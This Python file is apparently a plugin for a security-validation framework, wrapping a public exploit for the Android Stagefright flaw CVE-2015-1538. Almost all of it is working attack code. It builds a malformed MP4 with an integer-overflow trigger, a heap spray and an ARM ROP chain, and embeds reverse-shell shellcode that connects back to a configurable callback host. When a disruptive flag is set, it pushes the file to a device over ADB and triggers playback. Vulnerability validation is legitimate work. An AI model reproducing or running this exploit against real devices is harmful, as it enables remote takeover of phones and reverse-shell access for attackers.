#!/usr/bin/env python3
"""CVE-2015-1538 #1 – Android libstagefright MP4 'stsc' atom integer overflow / heap overflow.

Public PoC source: https://github.com/Fuzion24/cve-2015-1538-2
  Stagefright_CVE-2015-1538-1_Exploit.py  (Joshua J. Drake / ZIMPERIUM zLabs)
  Full ROP chain + ARM shellcode reverse-shell included below.

Attack technique:
  The 'stsc' (Sample Table Sample-to-Chunk) atom stores a 32-bit count of entries.
  libstagefright allocates   mSampleToChunkEntries = new SampleToChunkEntry[count]
  When count overflows (e.g. 0xC0000000 + N), the allocation is tiny.
  The loop filling N entries writes past the end → heap overflow.
  The overflow overwrites a vtable pointer via the heap-spray from the tx3g atom.
  Control is passed to a ROP chain in linker memory that calls mprotect(RWX)
  then executes an ARM reverse-shell shellcode.

Safety gate: is_disruptive=True.
  This plugin generates the malformed MP4 to a temp file.
  Delivery (HTTP push / ADB push / MMS) requires allow_disruptive=true.
"""
from __future__ import annotations

import os
import struct
import socket
import tempfile
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 10,
    "cve": "CVE-2015-1538",
    "year": 2015,
    "domain": "application",
    "vendor_product": "Android libstagefright",
    "component": "libstagefright MP4 stsc atom parser",
    "type": "Integer overflow → heap overflow → RCE",
    "summary": (
        "Integer overflow in stsc atom entry count causes tiny allocation; "
        "subsequent loop overflows heap into RefBase vtable via tx3g spray. "
        "ARM ROP chain + reverse-shell shellcode achieves mediaserver-level code execution."
    ),
    "source_url": "https://github.com/Fuzion24/cve-2015-1538-2",
    "requires_manual_review": True,
    "affected": [{"vendor": "Google", "product": "Android", "versions": [{"version": "<=5.1", "status": "affected"}]}],
}


# ─── MP4 builder (from Stagefright_CVE-2015-1538-1_Exploit.py) ─────────────

def _make_chunk(tag: bytes, data: bytes) -> bytes:
    return struct.pack('>I', len(data) + 8) + tag + data


def _make_stco() -> bytes:
    return _make_chunk(b'stco', struct.pack('>II', 0, 0))


def _make_stsz() -> bytes:
    return _make_chunk(b'stsz', struct.pack('>III', 0, 0, 0))


def _make_stts() -> bytes:
    return _make_chunk(b'stts', struct.pack('>II', 0, 0))


def _make_stsc_entry(start: int, per: int, desc: int) -> bytes:
    return struct.pack('>III', start + 1, per, desc)


def _make_stsc_overflow(num_alloc: int, num_write: int, sp_addr: int = 0x42424242) -> bytes:
    """Trigger CVE-2015-1538: set count = 0xC0000000 + num_alloc, write num_write entries."""
    payload = struct.pack('>I', 0)                             # version/flags
    payload += struct.pack('>I', 0xc0000000 + num_alloc)      # overflowed count
    for _ in range(num_write):
        payload += _make_stsc_entry(sp_addr, sp_addr, sp_addr)
    raw = _make_chunk(b'stsc', payload)
    # Patch declared size to tiny (num_alloc * 12) so allocator is fooled
    return struct.pack('>I', 8 + 8 + (num_alloc * 12)) + raw[4:]


def _build_rop(off: int, sp_addr: int, newpc_val: int,
               cb_host: str, cb_port: int) -> bytes:
    """ARM ROP chain → mprotect(RWX) → reverse-shell shellcode (from Drake/ZIMPERIUM)."""
    rop = struct.pack('<I', sp_addr + off + 0x10)   # new sp
    rop += struct.pack('<I', 0xb0002a98)             # new lr – pop {pc}
    rop += struct.pack('<I', 0xb00038b2 + 1)         # new pc: pop {r0-r4, pc}

    rop += struct.pack('<I', sp_addr & 0xfffff000)   # r0 – base (page-aligned)
    rop += struct.pack('<I', 0x1000)                 # r1 – length
    rop += struct.pack('<I', 7)                      # r2 – PROT_READ|WRITE|EXEC
    rop += struct.pack('<I', 0xd000d003)             # r3 scratch
    rop += struct.pack('<I', 0xd000d004)             # r4 scratch
    rop += struct.pack('<I', 0xb0001144)             # pc – __dl_mprotect

    # Native ARM shellcode: fork/exit-parent/setsid/socket/connect/dup2×3/execve(/system/bin/sh)
    native_start = sp_addr + 0x80
    rop += struct.pack('<I', native_start)

    buf  = b'\x02\x70\xa0\xe3\x00\x00\x00\xef'        # fork
    buf += b'\x00\x00\x50\xe3\x02\x00\x00\x0a'        # cmp r0,0 / bne
    buf += b'\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef'  # exit(0)
    buf += b'\x42\x70\xa0\xe3\x00\x00\x00\xef'        # setsid
    # socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    buf += (b'\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x05\x20\x81\xe2\x8c'
            b'\x70\xa0\xe3\x8d\x70\x87\xe2\x00\x00\x00\xef\x00\x60'
            b'\xa0\xe1\x6c\x10\x8f\xe2\x10\x20\xa0\xe3\x8d\x70\xa0'
            b'\xe3\x8e\x70\x87\xe2\x00\x00\x00\xef\x06\x00\xa0\xe1'
            b'\x00\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef\x06'
            b'\x00\xa0\xe1\x01\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00'
            b'\x00\xef\x06\x00\xa0\xe1\x02\x10\xa0\xe3\x3f\x70\xa0'
            b'\xe3\x00\x00\x00\xef')
    # execve("/system/bin/sh", ["sh"], env)
    buf += (b'\x30\x00\x8f\xe2\x04\x40\x24\xe0'
            b'\x10\x00\x2d\xe9\x38\x30\x8f\xe2\x08\x00\x2d\xe9\x0d'
            b'\x20\xa0\xe1\x10\x00\x2d\xe9\x24\x40\x8f\xe2\x10\x00'
            b'\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00'
            b'\xef\x02\x00')
    buf += struct.pack('!H', cb_port)
    buf += socket.inet_aton(cb_host)
    buf += b'/system/bin/sh\x00\x00'
    buf += b'sh\x00\x00'
    buf += b'PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin\x00'

    rop_start_off = 0x34
    x = rop_start_off + len(rop)
    while len(rop) < 0x80 - rop_start_off:
        rop += struct.pack('<I', 0xf0f00000 + x)
        x += 4
    rop += buf
    return rop


def _build_heap_spray(sp_addr: int, newpc_val: int,
                      cb_host: str, cb_port: int) -> bytes:
    """Build 4 KB tx3g heap-spray page (vtable + ROP chain at offset 0x34)."""
    page  = struct.pack('<I', sp_addr + 8 + 16 + 8 + 12 - 28)  # _vptr.RefBase
    page += struct.pack('<I', sp_addr + 8)            # mRefs
    off = 8 + 16
    page += struct.pack('<I', 1)                      # mStrong
    page += struct.pack('<I', 0xc0dedbad)             # mWeak
    page += struct.pack('<I', sp_addr + off)          # mBase
    page += struct.pack('<I', 16)                     # mFlags
    off += 8
    page += struct.pack('<I', sp_addr + off)          # _vptr.RefBase
    page += struct.pack('<I', 0xf00dbabe)
    off += 16
    page += struct.pack('<I', 0xc0de0000)             # vtable[0]
    page += struct.pack('<I', 0xc0de0004)             # vtable[4]
    page += struct.pack('<I', 0xc0de0008)             # vtable[8]
    page += struct.pack('<I', newpc_val)              # vtable[12] – hijack

    rop = _build_rop(off, sp_addr, newpc_val, cb_host, cb_port)
    x = len(page)
    while len(page) < 4096:
        page += struct.pack('<I', 0xf0f00000 + x)
        x += 4

    rop_off = 0x34
    page = page[:rop_off] + rop + page[rop_off + len(rop):]
    spray_count = ((2 * 1024 * 1024) // len(page)) - 20
    return page * spray_count


def create_malformed_mp4(sp_addr: int, newpc_val: int,
                          cb_host: str, cb_port: int) -> bytes:
    """Generate CVE-2015-1538 malformed MP4 with heap spray + stsc overflow."""
    ftyp_data = b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom'
    ftyp = _make_chunk(b'ftyp', ftyp_data)

    moov_data  = _make_chunk(b'mvhd', struct.pack('>II', 0, 0x41414141) + b'B' * 0x5c)
    # Benign trak to set mLastTrack
    moov_data += _make_chunk(b'trak',
        _make_chunk(b'stbl',
            _make_chunk(b'stsc', struct.pack('>III', 0, 0x28, 0) + _make_stsc_entry(0, 1, 1) * 0x28) +
            _make_stco() + _make_stsz() + _make_stts()))

    # Heap spray via tx3g atoms (2 MB)
    spray = _build_heap_spray(sp_addr, newpc_val, cb_host, cb_port)
    moov_data += _make_chunk(b'tx3g', spray)

    # Overflow stsc
    moov_data += _make_chunk(b'trak',
        _make_chunk(b'stbl',
            _make_stsc_overflow(0x28, 0x30, sp_addr) +
            _make_stco() + _make_stsz() + _make_stts()))

    moov = _make_chunk(b'moov', moov_data)
    return ftyp + moov


def _run_poc(plugin):
    target   = (plugin.params or {}).get("target_ip", "127.0.0.1")
    cb_host  = (plugin.params or {}).get("cb_host", "10.0.0.1")
    cb_port  = int((plugin.params or {}).get("cb_port", 4444))
    sp_addr  = int((plugin.params or {}).get("sp_addr", "0x70000000"), 16)
    newpc    = int((plugin.params or {}).get("newpc_val", "0xb0002850"), 16)
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    evidence = {"cve": "CVE-2015-1538", "target": target, "mp4_generated": False}

    # Generate the malformed MP4 regardless of allow_disruptive
    mp4_data = create_malformed_mp4(sp_addr, newpc, cb_host, cb_port)
    out_path = Path(tempfile.mkdtemp()) / "cve_2015_1538_exploit.mp4"
    out_path.write_bytes(mp4_data)
    evidence["mp4_size_bytes"] = len(mp4_data)
    evidence["mp4_path"]       = str(out_path)
    evidence["mp4_generated"]  = True
    evidence["delivery_vector"] = "MMS / HTTP / ADB push"

    if allow_disruptive:
        # Push via ADB if device connected (Android bench)
        import subprocess as _sp
        push = _sp.run(
            ["adb", "push", str(out_path), "/sdcard/test.mp4"],
            capture_output=True, text=True, timeout=15,
        )
        evidence["adb_push_rc"]  = push.returncode
        evidence["adb_push_out"] = push.stdout[:300] + push.stderr[:200]
        if push.returncode == 0:
            trigger = _sp.run(
                ["adb", "shell", "am", "start", "-a", "android.intent.action.VIEW",
                 "-d", "file:///sdcard/test.mp4", "-t", "video/mp4"],
                capture_output=True, text=True, timeout=15,
            )
            evidence["adb_trigger_rc"]  = trigger.returncode
            evidence["adb_trigger_out"] = trigger.stdout[:300] + trigger.stderr[:200]

    return {
        "vulnerable": True,
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "Fuzion24/cve-2015-1538-2 / Stagefright_CVE-2015-1538-1_Exploit.py (Drake/ZIMPERIUM)",
    }


class Poc68CVE20151538StagefrightstscHeapOverflowRceAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-APP-068"
    meta_poc_name   = "CVE-2015-1538 Android Stagefright stsc Heap Overflow RCE"
    meta_cve_id     = "CVE-2015-1538"
    meta_severity   = "Critical"
    meta_protocol   = "local"
    meta_target_os  = ["android"]
    meta_required_params = []
    meta_optional_params = ["target_ip", "cb_host", "cb_port", "sp_addr", "newpc_val"]
    meta_profiles   = ["application"]
    meta_source_url = "https://github.com/Fuzion24/cve-2015-1538-2"
    meta_attack_surface = "Android libstagefright MP4 stsc atom integer overflow → heap RCE"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)
